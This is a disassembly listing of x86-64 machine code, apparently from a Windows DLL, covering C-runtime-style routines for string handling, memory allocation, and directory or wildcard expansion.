   180008688:	4c 8b 65 e8          	mov    -0x18(%rbp),%r12
   18000868c:	4c 8b 7d e0          	mov    -0x20(%rbp),%r15
   180008690:	e9 f8 00 00 00       	jmp    0x18000878d
   180008695:	4c 8b 7d e0          	mov    -0x20(%rbp),%r15
   180008699:	4c 8b cf             	mov    %rdi,%r9
   18000869c:	4c 8b 65 e8          	mov    -0x18(%rbp),%r12
   1800086a0:	49 8b d7             	mov    %r15,%rdx
   1800086a3:	49 8b c4             	mov    %r12,%rax
   1800086a6:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   1800086aa:	49 2b c7             	sub    %r15,%rax
   1800086ad:	4c 8b c7             	mov    %rdi,%r8
   1800086b0:	4c 8b f0             	mov    %rax,%r14
   1800086b3:	49 c1 fe 03          	sar    $0x3,%r14
   1800086b7:	49 ff c6             	inc    %r14
   1800086ba:	48 8d 48 07          	lea    0x7(%rax),%rcx
   1800086be:	48 c1 e9 03          	shr    $0x3,%rcx
   1800086c2:	4d 3b fc             	cmp    %r12,%r15
   1800086c5:	48 0f 47 cf          	cmova  %rdi,%rcx
   1800086c9:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
   1800086cd:	48 85 c9             	test   %rcx,%rcx
   1800086d0:	74 25                	je     0x1800086f7
   1800086d2:	4c 8b 12             	mov    (%rdx),%r10
   1800086d5:	48 8b c6             	mov    %rsi,%rax
   1800086d8:	48 ff c0             	inc    %rax
   1800086db:	41 38 3c 02          	cmp    %dil,(%r10,%rax,1)
   1800086df:	75 f7                	jne    0x1800086d8
   1800086e1:	49 ff c1             	inc    %r9
   1800086e4:	48 83 c2 08          	add    $0x8,%rdx
   1800086e8:	4c 03 c8             	add    %rax,%r9
   1800086eb:	49 ff c0             	inc    %r8
   1800086ee:	4c 3b c1             	cmp    %rcx,%r8
   1800086f1:	75 df                	jne    0x1800086d2
   1800086f3:	4c 89 4d 50          	mov    %r9,0x50(%rbp)
   1800086f7:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1800086fd:	49 8b d1             	mov    %r9,%rdx
   180008700:	49 8b ce             	mov    %r14,%rcx
   180008703:	e8 bc e5 ff ff       	call   0x180006cc4
   180008708:	48 8b d8             	mov    %rax,%rbx
   18000870b:	48 85 c0             	test   %rax,%rax
   18000870e:	74 76                	je     0x180008786
   180008710:	4a 8d 14 f0          	lea    (%rax,%r14,8),%rdx
   180008714:	4d 8b f7             	mov    %r15,%r14
   180008717:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   18000871b:	48 8b c2             	mov    %rdx,%rax
   18000871e:	48 89 55 58          	mov    %rdx,0x58(%rbp)
   180008722:	4d 3b fc             	cmp    %r12,%r15
   180008725:	74 56                	je     0x18000877d
   180008727:	48 8b cb             	mov    %rbx,%rcx
   18000872a:	49 2b cf             	sub    %r15,%rcx
   18000872d:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
   180008731:	4d 8b 06             	mov    (%r14),%r8
   180008734:	4c 8b ee             	mov    %rsi,%r13
   180008737:	49 ff c5             	inc    %r13
   18000873a:	43 38 3c 28          	cmp    %dil,(%r8,%r13,1)
   18000873e:	75 f7                	jne    0x180008737
   180008740:	48 2b d0             	sub    %rax,%rdx
   180008743:	49 ff c5             	inc    %r13
   180008746:	48 03 55 50          	add    0x50(%rbp),%rdx
   18000874a:	4d 8b cd             	mov    %r13,%r9
   18000874d:	48 8b c8             	mov    %rax,%rcx
   180008750:	e8 cb 30 00 00       	call   0x18000b820
   180008755:	85 c0                	test   %eax,%eax
   180008757:	0f 85 83 00 00 00    	jne    0x1800087e0
   18000875d:	48 8b 45 58          	mov    0x58(%rbp),%rax
   180008761:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   180008765:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
   180008769:	4a 89 04 31          	mov    %rax,(%rcx,%r14,1)
   18000876d:	49 03 c5             	add    %r13,%rax
   180008770:	49 83 c6 08          	add    $0x8,%r14
   180008774:	48 89 45 58          	mov    %rax,0x58(%rbp)
   180008778:	4d 3b f4             	cmp    %r12,%r14
   18000877b:	75 b4                	jne    0x180008731
   18000877d:	48 8b 45 48          	mov    0x48(%rbp),%rax
   180008781:	8b f7                	mov    %edi,%esi
   180008783:	48 89 18             	mov    %rbx,(%rax)
   180008786:	33 c9                	xor    %ecx,%ecx
   180008788:	e8 07 fb ff ff       	call   0x180008294
   18000878d:	49 8b dc             	mov    %r12,%rbx
   180008790:	4d 8b f7             	mov    %r15,%r14
   180008793:	49 2b df             	sub    %r15,%rbx
   180008796:	48 83 c3 07          	add    $0x7,%rbx
   18000879a:	48 c1 eb 03          	shr    $0x3,%rbx
   18000879e:	4d 3b fc             	cmp    %r12,%r15
   1800087a1:	48 0f 47 df          	cmova  %rdi,%rbx
   1800087a5:	48 85 db             	test   %rbx,%rbx
   1800087a8:	74 14                	je     0x1800087be
   1800087aa:	49 8b 0e             	mov    (%r14),%rcx
   1800087ad:	e8 e2 fa ff ff       	call   0x180008294
   1800087b2:	48 ff c7             	inc    %rdi
   1800087b5:	4d 8d 76 08          	lea    0x8(%r14),%r14
   1800087b9:	48 3b fb             	cmp    %rbx,%rdi
   1800087bc:	75 ec                	jne    0x1800087aa
   1800087be:	49 8b cf             	mov    %r15,%rcx
   1800087c1:	e8 ce fa ff ff       	call   0x180008294
   1800087c6:	8b c6                	mov    %esi,%eax
   1800087c8:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   1800087cf:	00 
   1800087d0:	48 83 c4 60          	add    $0x60,%rsp
   1800087d4:	41 5f                	pop    %r15
   1800087d6:	41 5e                	pop    %r14
   1800087d8:	41 5d                	pop    %r13
   1800087da:	41 5c                	pop    %r12
   1800087dc:	5f                   	pop    %rdi
   1800087dd:	5e                   	pop    %rsi
   1800087de:	5d                   	pop    %rbp
   1800087df:	c3                   	ret
   1800087e0:	45 33 c9             	xor    %r9d,%r9d
   1800087e3:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1800087e8:	45 33 c0             	xor    %r8d,%r8d
   1800087eb:	33 d2                	xor    %edx,%edx
   1800087ed:	33 c9                	xor    %ecx,%ecx
   1800087ef:	e8 98 de ff ff       	call   0x18000668c
   1800087f4:	cc                   	int3
   1800087f5:	cc                   	int3
   1800087f6:	cc                   	int3
   1800087f7:	cc                   	int3
   1800087f8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800087fd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180008802:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180008807:	57                   	push   %rdi
   180008808:	41 54                	push   %r12
   18000880a:	41 55                	push   %r13
   18000880c:	41 56                	push   %r14
   18000880e:	41 57                	push   %r15
   180008810:	48 83 ec 30          	sub    $0x30,%rsp
   180008814:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   180008818:	49 8b f9             	mov    %r9,%rdi
   18000881b:	33 f6                	xor    %esi,%esi
   18000881d:	4d 8b f0             	mov    %r8,%r14
   180008820:	4c 8b ea             	mov    %rdx,%r13
   180008823:	4c 8b e1             	mov    %rcx,%r12
   180008826:	48 ff c5             	inc    %rbp
   180008829:	40 38 34 29          	cmp    %sil,(%rcx,%rbp,1)
   18000882d:	75 f7                	jne    0x180008826
   18000882f:	ba 01 00 00 00       	mov    $0x1,%edx
   180008834:	49 8b c6             	mov    %r14,%rax
   180008837:	48 03 ea             	add    %rdx,%rbp
   18000883a:	48 f7 d0             	not    %rax
   18000883d:	48 3b e8             	cmp    %rax,%rbp
   180008840:	76 20                	jbe    0x180008862
   180008842:	8d 42 0b             	lea    0xb(%rdx),%eax
   180008845:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   18000884a:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   18000884f:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   180008854:	48 83 c4 30          	add    $0x30,%rsp
   180008858:	41 5f                	pop    %r15
   18000885a:	41 5e                	pop    %r14
   18000885c:	41 5d                	pop    %r13
   18000885e:	41 5c                	pop    %r12
   180008860:	5f                   	pop    %rdi
   180008861:	c3                   	ret
   180008862:	4d 8d 78 01          	lea    0x1(%r8),%r15
   180008866:	4c 03 fd             	add    %rbp,%r15
   180008869:	49 8b cf             	mov    %r15,%rcx
   18000886c:	e8 ab f9 ff ff       	call   0x18000821c
   180008871:	48 8b d8             	mov    %rax,%rbx
   180008874:	4d 85 f6             	test   %r14,%r14
   180008877:	74 19                	je     0x180008892
   180008879:	4d 8b ce             	mov    %r14,%r9
   18000887c:	4d 8b c5             	mov    %r13,%r8
   18000887f:	49 8b d7             	mov    %r15,%rdx
   180008882:	48 8b c8             	mov    %rax,%rcx
   180008885:	e8 96 2f 00 00       	call   0x18000b820
   18000888a:	85 c0                	test   %eax,%eax
   18000888c:	0f 85 d8 00 00 00    	jne    0x18000896a
   180008892:	4d 2b fe             	sub    %r14,%r15
   180008895:	4a 8d 0c 33          	lea    (%rbx,%r14,1),%rcx
   180008899:	49 8b d7             	mov    %r15,%rdx
   18000889c:	4c 8b cd             	mov    %rbp,%r9
   18000889f:	4d 8b c4             	mov    %r12,%r8
   1800088a2:	e8 79 2f 00 00       	call   0x18000b820
   1800088a7:	85 c0                	test   %eax,%eax
   1800088a9:	0f 85 bb 00 00 00    	jne    0x18000896a
   1800088af:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   1800088b3:	44 8d 78 08          	lea    0x8(%rax),%r15d
   1800088b7:	4c 8b 77 10          	mov    0x10(%rdi),%r14
   1800088bb:	49 3b ce             	cmp    %r14,%rcx
   1800088be:	0f 85 9d 00 00 00    	jne    0x180008961
   1800088c4:	48 39 37             	cmp    %rsi,(%rdi)
   1800088c7:	75 2b                	jne    0x1800088f4
   1800088c9:	41 8b d7             	mov    %r15d,%edx
   1800088cc:	8d 48 04             	lea    0x4(%rax),%ecx
   1800088cf:	e8 48 f9 ff ff       	call   0x18000821c
   1800088d4:	33 c9                	xor    %ecx,%ecx
   1800088d6:	48 89 07             	mov    %rax,(%rdi)
   1800088d9:	e8 b6 f9 ff ff       	call   0x180008294
   1800088de:	48 8b 0f             	mov    (%rdi),%rcx
   1800088e1:	48 85 c9             	test   %rcx,%rcx
   1800088e4:	74 42                	je     0x180008928
   1800088e6:	48 8d 41 20          	lea    0x20(%rcx),%rax
   1800088ea:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   1800088ee:	48 89 47 10          	mov    %rax,0x10(%rdi)
   1800088f2:	eb 6d                	jmp    0x180008961
   1800088f4:	4c 2b 37             	sub    (%rdi),%r14
   1800088f7:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1800088fe:	ff ff 7f 
   180008901:	49 c1 fe 03          	sar    $0x3,%r14
   180008905:	4c 3b f0             	cmp    %rax,%r14
   180008908:	77 1e                	ja     0x180008928
   18000890a:	48 8b 0f             	mov    (%rdi),%rcx
   18000890d:	4b 8d 2c 36          	lea    (%r14,%r14,1),%rbp
   180008911:	48 8b d5             	mov    %rbp,%rdx
   180008914:	4d 8b c7             	mov    %r15,%r8
   180008917:	e8 d4 12 00 00       	call   0x180009bf0
   18000891c:	48 85 c0             	test   %rax,%rax
   18000891f:	75 22                	jne    0x180008943
   180008921:	33 c9                	xor    %ecx,%ecx
   180008923:	e8 6c f9 ff ff       	call   0x180008294
   180008928:	48 8b cb             	mov    %rbx,%rcx
   18000892b:	e8 64 f9 ff ff       	call   0x180008294
   180008930:	be 0c 00 00 00       	mov    $0xc,%esi
   180008935:	33 c9                	xor    %ecx,%ecx
   180008937:	e8 58 f9 ff ff       	call   0x180008294
   18000893c:	8b c6                	mov    %esi,%eax
   18000893e:	e9 02 ff ff ff       	jmp    0x180008845
   180008943:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   180008947:	48 89 07             	mov    %rax,(%rdi)
   18000894a:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   18000894e:	48 8d 0c e8          	lea    (%rax,%rbp,8),%rcx
   180008952:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   180008956:	33 c9                	xor    %ecx,%ecx
   180008958:	e8 37 f9 ff ff       	call   0x180008294
   18000895d:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   180008961:	48 89 19             	mov    %rbx,(%rcx)
   180008964:	4c 01 7f 08          	add    %r15,0x8(%rdi)
   180008968:	eb cb                	jmp    0x180008935
   18000896a:	45 33 c9             	xor    %r9d,%r9d
   18000896d:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180008972:	45 33 c0             	xor    %r8d,%r8d
   180008975:	33 d2                	xor    %edx,%edx
   180008977:	33 c9                	xor    %ecx,%ecx
   180008979:	e8 0e dd ff ff       	call   0x18000668c
   18000897e:	cc                   	int3
   18000897f:	cc                   	int3
   180008980:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180008985:	55                   	push   %rbp
   180008986:	56                   	push   %rsi
   180008987:	57                   	push   %rdi
   180008988:	41 54                	push   %r12
   18000898a:	41 55                	push   %r13
   18000898c:	41 56                	push   %r14
   18000898e:	41 57                	push   %r15
   180008990:	48 8d ac 24 d0 fd ff 	lea    -0x230(%rsp),%rbp
   180008997:	ff 
   180008998:	48 81 ec 30 03 00 00 	sub    $0x330,%rsp
   18000899f:	48 8b 05 6a 16 01 00 	mov    0x1166a(%rip),%rax        # 0x18001a010
   1800089a6:	48 33 c4             	xor    %rsp,%rax
   1800089a9:	48 89 85 20 02 00 00 	mov    %rax,0x220(%rbp)
   1800089b0:	4d 8b e0             	mov    %r8,%r12
   1800089b3:	48 8b f1             	mov    %rcx,%rsi
   1800089b6:	48 bb 01 08 00 00 00 	movabs $0x200000000801,%rbx
   1800089bd:	20 00 00 
   1800089c0:	48 3b d1             	cmp    %rcx,%rdx
   1800089c3:	74 22                	je     0x1800089e7
   1800089c5:	8a 02                	mov    (%rdx),%al
   1800089c7:	2c 2f                	sub    $0x2f,%al
   1800089c9:	3c 2d                	cmp    $0x2d,%al
   1800089cb:	77 0a                	ja     0x1800089d7
   1800089cd:	48 0f be c0          	movsbq %al,%rax
   1800089d1:	48 0f a3 c3          	bt     %rax,%rbx
   1800089d5:	72 10                	jb     0x1800089e7
   1800089d7:	48 8b ce             	mov    %rsi,%rcx
   1800089da:	e8 89 33 00 00       	call   0x18000bd68
   1800089df:	48 8b d0             	mov    %rax,%rdx
   1800089e2:	48 3b c6             	cmp    %rsi,%rax
   1800089e5:	75 de                	jne    0x1800089c5
   1800089e7:	44 8a 02             	mov    (%rdx),%r8b
   1800089ea:	41 80 f8 3a          	cmp    $0x3a,%r8b
   1800089ee:	75 1e                	jne    0x180008a0e
   1800089f0:	48 8d 46 01          	lea    0x1(%rsi),%rax
   1800089f4:	48 3b d0             	cmp    %rax,%rdx
   1800089f7:	74 15                	je     0x180008a0e
   1800089f9:	4d 8b cc             	mov    %r12,%r9
   1800089fc:	45 33 c0             	xor    %r8d,%r8d
   1800089ff:	33 d2                	xor    %edx,%edx
   180008a01:	48 8b ce             	mov    %rsi,%rcx
   180008a04:	e8 ef fd ff ff       	call   0x1800087f8
   180008a09:	e9 56 02 00 00       	jmp    0x180008c64
   180008a0e:	41 80 e8 2f          	sub    $0x2f,%r8b
   180008a12:	33 ff                	xor    %edi,%edi
   180008a14:	41 80 f8 2d          	cmp    $0x2d,%r8b
   180008a18:	77 0c                	ja     0x180008a26
   180008a1a:	49 0f be c0          	movsbq %r8b,%rax
   180008a1e:	48 0f a3 c3          	bt     %rax,%rbx
   180008a22:	b0 01                	mov    $0x1,%al
   180008a24:	72 03                	jb     0x180008a29
   180008a26:	40 8a c7             	mov    %dil,%al
   180008a29:	48 2b d6             	sub    %rsi,%rdx
   180008a2c:	48 89 7d a0          	mov    %rdi,-0x60(%rbp)
   180008a30:	48 ff c2             	inc    %rdx
   180008a33:	48 89 7d a8          	mov    %rdi,-0x58(%rbp)
   180008a37:	f6 d8                	neg    %al
   180008a39:	48 89 7d b0          	mov    %rdi,-0x50(%rbp)
   180008a3d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180008a42:	48 89 7d b8          	mov    %rdi,-0x48(%rbp)
   180008a46:	4d 1b ed             	sbb    %r13,%r13
   180008a49:	48 89 7d c0          	mov    %rdi,-0x40(%rbp)
   180008a4d:	4c 23 ea             	and    %rdx,%r13
   180008a50:	40 88 7d c8          	mov    %dil,-0x38(%rbp)
   180008a54:	33 d2                	xor    %edx,%edx
   180008a56:	e8 39 ee ff ff       	call   0x180007894
   180008a5b:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180008a60:	41 bf e9 fd 00 00    	mov    $0xfde9,%r15d
   180008a66:	44 39 78 0c          	cmp    %r15d,0xc(%rax)
   180008a6a:	75 18                	jne    0x180008a84
   180008a6c:	40 38 7c 24 48       	cmp    %dil,0x48(%rsp)
   180008a71:	74 0c                	je     0x180008a7f
   180008a73:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180008a78:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   180008a7f:	45 8b c7             	mov    %r15d,%r8d
   180008a82:	eb 3a                	jmp    0x180008abe
   180008a84:	e8 27 14 00 00       	call   0x180009eb0
   180008a89:	85 c0                	test   %eax,%eax
   180008a8b:	75 1b                	jne    0x180008aa8
   180008a8d:	40 38 7c 24 48       	cmp    %dil,0x48(%rsp)
   180008a92:	74 0c                	je     0x180008aa0
   180008a94:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180008a99:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   180008aa0:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180008aa6:	eb 16                	jmp    0x180008abe
   180008aa8:	40 38 7c 24 48       	cmp    %dil,0x48(%rsp)
   180008aad:	74 0c                	je     0x180008abb
   180008aaf:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180008ab4:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   180008abb:	44 8b c7             	mov    %edi,%r8d
   180008abe:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   180008ac2:	48 8b ce             	mov    %rsi,%rcx
   180008ac5:	e8 1e f8 ff ff       	call   0x1800082e8
   180008aca:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   180008ace:	4c 8d 45 d0          	lea    -0x30(%rbp),%r8
   180008ad2:	85 c0                	test   %eax,%eax
   180008ad4:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   180008ad8:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180008add:	48 0f 45 cf          	cmovne %rdi,%rcx
   180008ae1:	45 33 c9             	xor    %r9d,%r9d
   180008ae4:	33 d2                	xor    %edx,%edx
   180008ae6:	ff 15 74 76 00 00    	call   *0x7674(%rip)        # 0x180010160
   180008aec:	48 8b d8             	mov    %rax,%rbx
   180008aef:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   180008af3:	75 17                	jne    0x180008b0c
   180008af5:	4d 8b cc             	mov    %r12,%r9
   180008af8:	45 33 c0             	xor    %r8d,%r8d
   180008afb:	33 d2                	xor    %edx,%edx
   180008afd:	48 8b ce             	mov    %rsi,%rcx
   180008b00:	e8 f3 fc ff ff       	call   0x1800087f8
   180008b05:	8b f8                	mov    %eax,%edi
   180008b07:	e9 47 01 00 00       	jmp    0x180008c53
   180008b0c:	4d 8b 74 24 08       	mov    0x8(%r12),%r14
   180008b11:	4d 2b 34 24          	sub    (%r12),%r14
   180008b15:	49 c1 fe 03          	sar    $0x3,%r14
   180008b19:	33 d2                	xor    %edx,%edx
   180008b1b:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   180008b20:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180008b25:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   180008b2a:	48 89 7d 80          	mov    %rdi,-0x80(%rbp)
   180008b2e:	48 89 7d 88          	mov    %rdi,-0x78(%rbp)
   180008b32:	48 89 7d 90          	mov    %rdi,-0x70(%rbp)
   180008b36:	40 88 7d 98          	mov    %dil,-0x68(%rbp)
   180008b3a:	e8 55 ed ff ff       	call   0x180007894
   180008b3f:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   180008b44:	44 39 78 0c          	cmp    %r15d,0xc(%rax)
   180008b48:	75 18                	jne    0x180008b62
   180008b4a:	40 38 7c 24 68       	cmp    %dil,0x68(%rsp)
   180008b4f:	74 0c                	je     0x180008b5d
   180008b51:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   180008b56:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   180008b5d:	45 8b c7             	mov    %r15d,%r8d
   180008b60:	eb 3a                	jmp    0x180008b9c
   180008b62:	e8 49 13 00 00       	call   0x180009eb0
   180008b67:	85 c0                	test   %eax,%eax
   180008b69:	75 1b                	jne    0x180008b86
   180008b6b:	40 38 7c 24 68       	cmp    %dil,0x68(%rsp)
   180008b70:	74 0c                	je     0x180008b7e
   180008b72:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   180008b77:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   180008b7e:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180008b84:	eb 16                	jmp    0x180008b9c
   180008b86:	40 38 7c 24 68       	cmp    %dil,0x68(%rsp)
   180008b8b:	74 0c                	je     0x180008b99
   180008b8d:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   180008b92:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   180008b99:	44 8b c7             	mov    %edi,%r8d
   180008b9c:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   180008ba1:	48 8d 4d fc          	lea    -0x4(%rbp),%rcx
   180008ba5:	e8 b6 f8 ff ff       	call   0x180008460
   180008baa:	4c 8b 7d 80          	mov    -0x80(%rbp),%r15
   180008bae:	85 c0                	test   %eax,%eax
   180008bb0:	49 8b cf             	mov    %r15,%rcx
   180008bb3:	48 0f 45 cf          	cmovne %rdi,%rcx
   180008bb7:	80 39 2e             	cmpb   $0x2e,(%rcx)
   180008bba:	75 11                	jne    0x180008bcd
   180008bbc:	8a 41 01             	mov    0x1(%rcx),%al
   180008bbf:	84 c0                	test   %al,%al
   180008bc1:	74 20                	je     0x180008be3
   180008bc3:	3c 2e                	cmp    $0x2e,%al
   180008bc5:	75 06                	jne    0x180008bcd
   180008bc7:	40 38 79 02          	cmp    %dil,0x2(%rcx)
   180008bcb:	74 16                	je     0x180008be3
   180008bcd:	4d 8b cc             	mov    %r12,%r9
   180008bd0:	4d 8b c5             	mov    %r13,%r8
   180008bd3:	48 8b d6             	mov    %rsi,%rdx
   180008bd6:	e8 1d fc ff ff       	call   0x1800087f8
   180008bdb:	8b f8                	mov    %eax,%edi
   180008bdd:	85 c0                	test   %eax,%eax
   180008bdf:	75 5b                	jne    0x180008c3c
   180008be1:	33 ff                	xor    %edi,%edi
   180008be3:	40 38 7d 98          	cmp    %dil,-0x68(%rbp)
   180008be7:	74 08                	je     0x180008bf1
   180008be9:	49 8b cf             	mov    %r15,%rcx
   180008bec:	e8 a3 f6 ff ff       	call   0x180008294
   180008bf1:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   180008bf5:	48 8b cb             	mov    %rbx,%rcx
   180008bf8:	ff 15 6a 75 00 00    	call   *0x756a(%rip)        # 0x180010168
   180008bfe:	41 bf e9 fd 00 00    	mov    $0xfde9,%r15d
   180008c04:	85 c0                	test   %eax,%eax
   180008c06:	0f 85 0d ff ff ff    	jne    0x180008b19
   180008c0c:	49 8b 04 24          	mov    (%r12),%rax
   180008c10:	49 8b 54 24 08       	mov    0x8(%r12),%rdx
   180008c15:	48 2b d0             	sub    %rax,%rdx
   180008c18:	48 c1 fa 03          	sar    $0x3,%rdx
   180008c1c:	4c 3b f2             	cmp    %rdx,%r14
   180008c1f:	74 29                	je     0x180008c4a
   180008c21:	49 2b d6             	sub    %r14,%rdx
   180008c24:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   180008c28:	4c 8d 0d a5 f6 ff ff 	lea    -0x95b(%rip),%r9        # 0x1800082d4
   180008c2f:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   180008c35:	e8 46 28 00 00       	call   0x18000b480
   180008c3a:	eb 0e                	jmp    0x180008c4a
   180008c3c:	80 7d 98 00          	cmpb   $0x0,-0x68(%rbp)
   180008c40:	74 08                	je     0x180008c4a
   180008c42:	49 8b cf             	mov    %r15,%rcx
   180008c45:	e8 4a f6 ff ff       	call   0x180008294
   180008c4a:	48 8b cb             	mov    %rbx,%rcx
   180008c4d:	ff 15 05 75 00 00    	call   *0x7505(%rip)        # 0x180010158
   180008c53:	80 7d c8 00          	cmpb   $0x0,-0x38(%rbp)
   180008c57:	74 09                	je     0x180008c62
   180008c59:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   180008c5d:	e8 32 f6 ff ff       	call   0x180008294
   180008c62:	8b c7                	mov    %edi,%eax
   180008c64:	48 8b 8d 20 02 00 00 	mov    0x220(%rbp),%rcx
   180008c6b:	48 33 cc             	xor    %rsp,%rcx
   180008c6e:	e8 4d 8e ff ff       	call   0x180001ac0
   180008c73:	48 8b 9c 24 88 03 00 	mov    0x388(%rsp),%rbx
   180008c7a:	00 
   180008c7b:	48 81 c4 30 03 00 00 	add    $0x330,%rsp
   180008c82:	41 5f                	pop    %r15
   180008c84:	41 5e                	pop    %r14
   180008c86:	41 5d                	pop    %r13
   180008c88:	41 5c                	pop    %r12
   180008c8a:	5f                   	pop    %rdi
   180008c8b:	5e                   	pop    %rsi
   180008c8c:	5d                   	pop    %rbp
   180008c8d:	c3                   	ret
   180008c8e:	cc                   	int3
   180008c8f:	cc                   	int3
   180008c90:	e9 57 f9 ff ff       	jmp    0x1800085ec
   180008c95:	cc                   	int3
   180008c96:	cc                   	int3
   180008c97:	cc                   	int3
   180008c98:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180008c9d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180008ca2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180008ca7:	57                   	push   %rdi
   180008ca8:	48 83 ec 40          	sub    $0x40,%rsp
   180008cac:	33 db                	xor    %ebx,%ebx
   180008cae:	41 8b e8             	mov    %r8d,%ebp
   180008cb1:	48 8b fa             	mov    %rdx,%rdi
   180008cb4:	48 8b f1             	mov    %rcx,%rsi
   180008cb7:	48 85 c9             	test   %rcx,%rcx
   180008cba:	75 19                	jne    0x180008cd5
   180008cbc:	38 5a 28             	cmp    %bl,0x28(%rdx)
   180008cbf:	74 03                	je     0x180008cc4
   180008cc1:	88 5a 28             	mov    %bl,0x28(%rdx)
   180008cc4:	48 89 5a 10          	mov    %rbx,0x10(%rdx)
   180008cc8:	48 89 5a 18          	mov    %rbx,0x18(%rdx)
   180008ccc:	48 89 5a 20          	mov    %rbx,0x20(%rdx)
   180008cd0:	e9 bd 00 00 00       	jmp    0x180008d92
   180008cd5:	66 39 19             	cmp    %bx,(%rcx)
   180008cd8:	75 30                	jne    0x180008d0a
   180008cda:	48 39 5a 18          	cmp    %rbx,0x18(%rdx)
   180008cde:	75 22                	jne    0x180008d02
   180008ce0:	38 5a 28             	cmp    %bl,0x28(%rdx)
   180008ce3:	74 03                	je     0x180008ce8
   180008ce5:	88 5a 28             	mov    %bl,0x28(%rdx)
   180008ce8:	e8 0f f5 ff ff       	call   0x1800081fc
   180008ced:	b9 22 00 00 00       	mov    $0x22,%ecx
   180008cf2:	89 08                	mov    %ecx,(%rax)
   180008cf4:	88 5f 28             	mov    %bl,0x28(%rdi)
   180008cf7:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   180008cfb:	8b d9                	mov    %ecx,%ebx
   180008cfd:	e9 90 00 00 00       	jmp    0x180008d92
   180008d02:	48 8b 42 10          	mov    0x10(%rdx),%rax
   180008d06:	88 18                	mov    %bl,(%rax)
   180008d08:	eb c2                	jmp    0x180008ccc
   180008d0a:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   180008d0f:	41 83 c9 ff          	or     $0xffffffff,%r9d
   180008d13:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180008d18:	4c 8b c6             	mov    %rsi,%r8
   180008d1b:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   180008d1f:	33 d2                	xor    %edx,%edx
   180008d21:	8b cd                	mov    %ebp,%ecx
   180008d23:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180008d28:	e8 0f 0d 00 00       	call   0x180009a3c
   180008d2d:	48 63 d0             	movslq %eax,%rdx
   180008d30:	85 c0                	test   %eax,%eax
   180008d32:	75 16                	jne    0x180008d4a
   180008d34:	ff 15 86 73 00 00    	call   *0x7386(%rip)        # 0x1800100c0
   180008d3a:	8b c8                	mov    %eax,%ecx
   180008d3c:	e8 4b f4 ff ff       	call   0x18000818c
   180008d41:	e8 b6 f4 ff ff       	call   0x1800081fc
   180008d46:	8b 18                	mov    (%rax),%ebx
   180008d48:	eb 48                	jmp    0x180008d92
   180008d4a:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   180008d4e:	48 3b d1             	cmp    %rcx,%rdx
   180008d51:	76 0a                	jbe    0x180008d5d
   180008d53:	38 5f 28             	cmp    %bl,0x28(%rdi)
   180008d56:	74 90                	je     0x180008ce8
   180008d58:	88 5f 28             	mov    %bl,0x28(%rdi)
   180008d5b:	eb 8b                	jmp    0x180008ce8
   180008d5d:	48 8b 47 10          	mov    0x10(%rdi),%rax
